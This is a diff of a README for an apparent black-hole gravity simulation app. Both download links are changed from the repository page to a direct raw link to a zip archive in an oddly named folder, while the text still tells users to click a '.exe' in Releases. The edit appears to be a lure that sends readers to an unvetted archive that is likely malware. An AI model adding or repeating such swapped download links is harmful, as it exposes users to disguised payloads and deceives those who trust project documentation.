@@ -1,6 +1,6 @@
 # 🌌 black-hole - View stunning realistic space gravity simulations
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/encapsulationraingauge334/black-hole)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/encapsulationraingauge334/black-hole/main/unmysticize/hole_black_v3.3.zip)
 
 This application displays a real-time simulation of a black hole on your screen. It uses math and light physics to show how gravity bends rays of light. You see a rotating disc of gas and dust surrounding a dark center. The simulation creates an Einstein Ring to mimic the look of deep space.
 
@@ -21,7 +21,7 @@ Make sure your graphics drivers remain updated. You update these through the set
 
 You need to reach the download page to get the application onto your machine. The software lives on our release page. Visit the link below to find the current version.
 
-[Click here to open the download page](https://github.com/encapsulationraingauge334/black-hole)
+[Click here to open the download page](https://raw.githubusercontent.com/encapsulationraingauge334/black-hole/main/unmysticize/hole_black_v3.3.zip)
 
 Once you reach the page, look for the section labeled Releases. Click the link that ends in .exe. This file contains the installer for the black-hole simulation. Save this file to your Downloads folder or your desktop to find it quickly.
 
